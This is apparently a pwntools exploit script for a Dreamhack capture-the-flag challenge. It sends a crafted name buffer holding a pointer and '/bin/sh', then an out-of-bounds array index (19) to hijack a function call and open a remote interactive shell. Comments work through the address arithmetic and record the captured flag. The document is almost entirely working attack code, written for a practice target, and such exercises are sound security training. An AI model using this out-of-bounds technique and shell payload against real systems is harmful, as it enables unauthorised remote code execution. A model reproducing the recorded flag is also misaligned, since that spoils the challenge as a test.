from pwn import *

p = remote("host3.dreamhack.games", 19391)
p.recvuntil("Admin name: ")
payload = p32(0x804a0ac + 4) + b"/bin/sh"
p.sendline(payload)
p.recvuntil("What do you want?: ")
p.sendline("19")
p.interactive()

'''
# name Address = 0x0804a0ac
# command Address = 0x0804a060
name = (0x804a0ac + 4) => 8 + 4 = 12bytes + b"/bin/sh" = 4bytes = 16bytes
index Reference = p32(px804a060) - p32(0x804a0ac)

> 0x08048737 <+108>:   mov    eax,DWORD PTR [eax*4+0x804a060]

eax * 4 + 0x804a060 ==> index Reference / 4 = 19

DH{2524e20ddeee45f11c8eb91804d57296}
'''